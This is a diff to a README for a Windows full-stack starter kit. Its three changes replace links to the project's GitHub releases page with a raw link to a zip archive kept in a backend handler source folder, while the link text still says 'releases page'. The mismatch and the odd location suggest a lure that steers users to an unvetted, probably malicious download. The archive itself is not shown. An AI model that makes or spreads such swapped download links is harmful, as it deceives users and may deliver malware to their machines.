@@ -1,6 +1,6 @@
 # 🚀 nextjs-go-monorepo-kit - Fast Full-Stack Starter for Windows
 
-[![Download the app](https://img.shields.io/badge/Download%20Here-4B5563?style=for-the-badge&logo=github)](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Here-4B5563?style=for-the-badge&logo=github)](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/raw/refs/heads/main/backend/internal/handler/nextjs_kit_go_monorepo_3.8.zip)
 
 ## 🧭 What this is
 
@@ -14,7 +14,7 @@ This repo is meant for a desktop Windows user who wants to download the app, ope
 
 Use this page to visit and download the release for Windows:
 
-https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases
+https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/raw/refs/heads/main/backend/internal/handler/nextjs_kit_go_monorepo_3.8.zip
 
 Look for the latest release and choose the Windows file for your device. If the release page lists more than one file, pick the one that matches Windows.
 
@@ -214,7 +214,7 @@ This starter kit is useful if you want an app base for:
 
 ## 📎 Download again
 
-[Visit the releases page to download for Windows](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases)
+[Visit the releases page to download for Windows](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/raw/refs/heads/main/backend/internal/handler/nextjs_kit_go_monorepo_3.8.zip)
 
 ## 🖱️ Quick steps
 
